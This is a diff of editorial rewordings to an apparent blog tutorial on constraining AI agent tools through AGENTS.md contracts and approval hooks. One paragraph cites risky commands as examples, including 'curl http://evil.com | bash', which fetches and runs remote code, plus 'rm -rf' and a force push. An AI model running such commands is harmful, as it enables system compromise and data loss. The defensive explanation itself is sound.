@@ -4,7 +4,7 @@ slug: "ai-path-l3-day3-hard-constraints"
 date: 2026-10-09T10:00:00+08:00
 publishDate: 2026-10-09T10:00:00+08:00
 draft: false
-description: "AI Path L3 backbone article: why 'allow everything' is wrong, how static contracts constrain tool permissions, and how lifecycle hooks implement approval interception."
+description: "AI Path L3 backbone article: why 'allow everything' fails, how static contracts constrain tool permissions, and how lifecycle hooks implement approval interception."
 tags: ["AI", "tutorial", "Harness", "Agent Loop", "Hook", "Static Contract", "Hard Constraints"]
 categories: ["ai-path"]
 toc: true
@@ -14,7 +14,7 @@ cover:
   alt: 'Watercolor style: A contract document locked with chains, beside three checkpoint gates labeled "read files", "modify code", "execute commands"'
 ---
 
-> Previous article: [Day 2 | Minimalism and Hard Isolation: The Pi Paradigm](/en/posts/2026/09/ai-path-l3-day2-pi-minimalism/). After understanding why Pi cuts features, we now address a more specific question: after the cuts, how should the remaining capabilities be managed?
+> Previous article: [Day 2 | Minimalism and Hard Isolation: The Pi Paradigm](/en/posts/2026/09/ai-path-l3-day2-pi-minimalism/). Now that we understand why Pi strips features, we now address a more specific question: after the cuts, how should the remaining capabilities be managed?
 
 This is the backbone article of L3. Navigation for subsequent articles:
 
@@ -34,21 +34,21 @@ This is the backbone article of L3. Navigation for subsequent articles:
 
 Day 1's miniharness had 7 tools; Day 2's Pi cut it down to 4. Regardless of the count, they share a common premise: **all tools are available by default**.
 
-You ask an Agent to write code, and it "needs" bash permissions to run tests and modify files. Give it bash, and you've given it the ability to run `rm -rf /tmp/build`, `git push --force`, `curl http://evil.com | bash`. You trust it, but every time it calls a tool, it asks the model: is this step safe? The model says "yes," you click allow, and it executes.
+You ask an agent to write code, and it "needs" bash permissions to run tests and modify files. Give it bash, and you've given it the ability to run `rm -rf /tmp/build`, `git push --force`, `curl http://evil.com | bash`. You trust it, but every time it calls a tool, it asks the model: is this step safe? The model says "yes," you click allow, and it executes.
 
 This is the "performative security" criticized in Day 2—permission popups aren't security; they just make you *feel* secure.
 
-The real security model has two layers: **static constraints** lock permissions at harness startup; **dynamic interception** routes every call through a Hook for review. Together, these form the Harness's hard constraints.
+A robust security model relies on two layers: **static constraints** lock permissions at harness startup; **dynamic interception** routes every call through a Hook for review. Together, these form the Harness's hard constraints.
 
 ## Static Contracts: The AGENTS.md Format Convention
 
 Let's look at the first layer: static constraints.
 
-The core question of static constraints is: **how do you make the model aware of its capabilities and limitations from the start?**
+The core question for static constraints is: **how do you make the model aware of its capabilities and limitations from the start?**
 
-The answer is a file called `AGENTS.md`. This file sits in the project root and tells the Agent the project structure, coding standards, which tools can be used, and how to report completion.
+The answer is a file called `AGENTS.md`. This file sits in the project root and outlines the project structure, coding standards, which tools can be used, and how to report completion.
 
-AGENTS.md acts as a static contract definition. While injected into the model's context like a prompt, its power comes from the harness runtime, which validates model outputs against these rules and aborts execution upon violation.
+AGENTS.md acts as a static contract definition. Although AGENTS.md is injected into context like a standard prompt, its power comes from the harness runtime, which validates model outputs against these rules and aborts execution upon violation.
 
 ```markdown
 # AGENTS.md
@@ -112,7 +112,7 @@ class Hook:
 
 Hooks can do many things:
 
-- **Permission checks**: In `on_before_tool`, check the AGENTS.md allowlist; if the command isn't in the list, raise an exception
+- **Permission checks**: In `on_before_tool`, check the AGENTS.md allowlist and raise an exception if the command isn't allowed.
 - **Parameter rewriting**: Change the model's `rm -rf /tmp/build` to a safer alternative command
 - **Result validation**: In `on_after_tool`, check if the output meets expectations; if not, trigger a retry
 - **Trace logging**: Write every tool call's input and output to a log file for post-hoc review
